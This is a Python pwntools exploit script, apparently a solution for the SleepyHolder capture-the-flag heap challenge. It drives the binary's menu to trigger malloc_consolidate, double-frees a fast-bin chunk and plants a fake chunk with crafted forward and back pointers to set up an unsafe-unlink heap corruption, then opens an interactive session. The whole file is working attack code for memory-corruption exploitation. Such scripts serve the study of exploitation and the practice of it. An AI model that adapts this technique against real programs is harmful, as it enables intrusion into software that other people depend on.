#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
import os


context(arch="amd64", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.e = ELF("./SleepyHolder")
        self.libc = ELF("./libc.so.6")
        self.p = None

    def start_binary(self):
        self.p = process("./SleepyHolder", env={
            "LD_PRELOAD": "libc.so.6"
        })
        self.p.recvuntil("Renew secret\n")

    def allocate_cmd(self, size, buff):
        self.p.sendline("1")
        self.p.recvuntil("Big secret\n")
        self.p.clean()
        self.p.sendline(str(size))
        self.p.recvuntil("secret: \n")
        self.p.send(buff)
        self.p.recvuntil("Renew secret\n")

    def free_cmd(self, size):
        self.p.sendline("2")
        self.p.recvuntil("Big secret\n")
        self.p.sendline(str(size))
        self.p.recvuntil("Renew secret\n")

    def edit_cmd(self, size, buff):
        self.p.sendline("3")
        self.p.recvuntil("Big secret")
        self.p.sendline(str(size))
        self.p.recvuntil("secret: \n")
        self.p.sendline(buff)
        self.p.recvuntil("Renew secret\n")

    def pwn_binary(self):
        self.start_binary()

        pause()
        self.allocate_cmd(1, "A"*5)
        self.allocate_cmd(2, "B"*5)

        # Add first chunk into fast bin free list
        self.free_cmd(1)

        # Trigger malloc_consolidate(), move fast bins to small bin and update prev_inuse bits
        self.allocate_cmd(3, "C"*5)

        # Double free our fast bin to leave our consolidated small bin and overlap the second chunk
        self.free_cmd(1)
        f_ptr = 0x6020d0
        fake_chunk = p64(0) + p64(0x21)
        fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr-0x10)
        fake_chunk += '\x20'
        self.allocate_cmd(1, fake_chunk)

        self.free_cmd(2)

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
